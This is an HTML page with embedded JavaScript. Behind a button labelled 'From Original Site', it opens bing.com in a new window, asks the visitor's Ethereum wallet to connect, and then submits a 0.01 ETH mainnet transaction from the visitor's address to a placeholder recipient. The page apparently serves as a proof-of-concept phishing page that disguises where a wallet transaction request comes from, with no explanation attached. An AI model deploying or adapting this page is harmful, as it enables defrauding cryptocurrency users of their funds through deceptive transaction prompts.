<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script>
    async function openBingAndPromptWallet() {
      // Open bing.com
      const bingWindow = window.open('https://bing.com', 'x');

      // Check for wallet connection
      await promptWalletConnection();

      // Store the wallet connection status in local storage
      localStorage.setItem('walletConnected', 'true');

      // Poll for changes in local storage at an interval
      const checkLocalStorage = setInterval(() => {
        const walletConnected = localStorage.getItem('walletConnected');
        if (walletConnected === 'true') {
          clearInterval(checkLocalStorage);
          sendTransaction();
        }
      }, 1000);
    }

    async function promptWalletConnection() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          // Request wallet connection
          await ethereum.request({ method: 'eth_requestAccounts' });
          alert('Wallet connected successfully!');
        } catch (error) {
          alert('Wallet connection request rejected by the user.');
        }
      } else {
        alert('Web3 (Ethereum provider) is not available in this browser.');
      }
    }

    async function sendTransaction() {
      const transactionParameters = {
        nonce: "0x00",
        gasPrice: "0x244AC6D",
        gas: "0x12A52",
        to: "0x0000000000000000000000000000000000000000", // Replace with the actual recipient address
        from: ethereum.selectedAddress,
        value: "0x2386F26FC10000",
        data: "0x00",
        chainId: "0x1",
      };

      try {
        const txHash = await ethereum.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });
        alert(`Transaction sent! Transaction hash: ${txHash}`);
      } catch (error) {
        alert(`Error sending transaction: ${error.message}`);
      }
    }
  </script>
  <center>
    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
  </center>
</body>
</html>
